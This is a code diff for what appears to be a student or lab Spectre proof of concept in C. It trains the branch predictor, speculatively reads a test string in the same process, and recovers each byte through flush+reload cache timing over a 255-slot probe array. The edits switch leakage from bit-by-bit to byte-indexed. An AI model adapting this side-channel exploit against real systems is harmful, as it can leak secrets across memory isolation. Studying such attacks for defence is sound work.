@@ -5,22 +5,21 @@
 #include <stdbool.h>
 #include <stdint.h>
 #include "../fr.h"
-char buf[4096];
+char buf[4*1024*1024*255];
 bool take = true;
-#define THRESHOLD 300
-#define TRAIN_SIZE 3000
+#define THRESHOLD 200
+#define TRAIN_SIZE 30000
 
 
+#define L3_CACHE_LINE_SIZE 32768
 
-char* secret = "spectre test";
-void branch(char* a, int j)
+char* secret = "This is going to be a very long prompt to test the flush and reload and make sure i got the cache line size correct";
+void branch(char* a)
 {
     if (take)
     {
-        if (*a & (1 << j))
-        {
-            buf[0] = 1;
-        }
+        char data = *a;
+        buf[*a * L3_CACHE_LINE_SIZE] = 1;
     }
     
 }
@@ -34,10 +33,12 @@ void train()
     for (int i = 0; i < TRAIN_SIZE; i++)
     {
         flush(&take);
-        branch(&a, 0);
+        branch(&a);
         flush(&take);
     }
     take = false;
+    for (int j = 0; j < 255; j++)
+        flush(&buf[j*L3_CACHE_LINE_SIZE]);
     flush(&take);
 }
 
@@ -45,17 +46,27 @@ void train()
 char spectre_read(char* secret, int offset)
 {
     char c = 0x0;
-    for (int j = 0; j < 8; j++)
+
+    train();
+    branch(secret + offset);
+
+    for (int j = 0; j < 255; j++)
     {
-        train();
-        flush(&buf[0]);
-        branch(secret + offset, j);
         unsigned long timing;
-        if ((timing = probe_timing(&buf[0])) < THRESHOLD)
+        if ((timing = probe_timing(&buf[j*L3_CACHE_LINE_SIZE])) < THRESHOLD)
         {
-            c |= (1<<j);
-        }
+            c = j;
+            flush(&buf[j*L3_CACHE_LINE_SIZE]);
+            //printf("Hit timing %d\n", timing);
+            //printf("j: %d\n", j);
+            break;
+        }    
+       // printf("Miss timing %d\n", timing); 
     }
+
+    for (int j = 0; j < 255; j++)
+        flush(&buf[j*L3_CACHE_LINE_SIZE]);
+
     return c;
 }
 
@@ -71,18 +82,17 @@ int main(int argc, char** argv)
     found_secret[strlen(secret)] = 0;
     memset(found_secret, 0x0, strlen(secret));
 
-
+    printf("\n\n");
     for (int i = 0; i < strlen(secret); i++)
     {
         char c1 = 0x0;
-        char c2 = 0x0;
-        while((c1 = spectre_read(secret, i)) > 150 || c1 < 31);
-
-
+        c1 = spectre_read(secret, i);
+        printf("%c", c1);
         found_secret[i] = c1;
-        printf("Found Secret: %s\n", found_secret);
+       // break;
+        //printf("Found Secret: %s\n", found_secret);
     }
-    printf("Found Secret: %s\n", found_secret);
+    //printf("Found Secret: %s\n", found_secret);
 
     return 0;
 }
